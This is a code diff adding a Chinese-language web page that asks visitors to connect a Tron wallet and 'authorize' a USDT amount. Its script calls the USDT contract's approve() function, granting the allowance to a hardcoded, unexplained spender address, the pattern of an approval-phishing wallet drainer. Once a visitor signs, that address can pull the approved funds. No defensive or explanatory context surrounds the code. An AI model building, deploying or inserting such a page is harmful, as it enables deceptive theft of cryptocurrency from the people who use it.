@@ -1,0 +1,45 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>USDT 授权合约</title>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 2em; background: #f7f7f7; }
+    input { padding: 10px; margin: 10px; width: 300px; }
+    button { padding: 10px 20px; background-color: #28a745; color: white; border: none; cursor: pointer; }
+    button:hover { background-color: #218838; }
+  </style>
+</head>
+<body>
+  <h2>TRC20 USDT 合约授权</h2>
+  <p>请连接支持 Tron 的钱包（如 TronLink / TokenPocket 等），并授权 USDT 操作权限。</p>
+  <div>
+    <input type="number" id="amount" placeholder="授权金额 USDT" />
+    <br />
+    <button onclick="authorize()">授权 USDT</button>
+  </div>
+
+  <script>
+    async function authorize() {
+      const amount = document.getElementById("amount").value;
+      if (!amount || isNaN(amount)) {
+        return Swal.fire("错误", "请输入正确的授权金额", "error");
+      }
+
+      if (!window.tronWeb || !window.tronWeb.ready) {
+        return Swal.fire("未检测到钱包", "请使用 TronLink 或钱包内置浏览器打开本页", "warning");
+      }
+
+      try {
+        const usdt = await window.tronWeb.contract().at("TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj");
+        const result = await usdt.approve("TUrsZLBMztAVQf4uo8Gekcp2Fo88888888", window.tronWeb.toSun(amount)).send();
+        Swal.fire("授权已提交", "交易 ID: " + result, "success");
+      } catch (e) {
+        Swal.fire("授权失败", e.message || "请检查钱包连接或重试", "error");
+      }
+    }
+  </script>
+</body>
+</html>
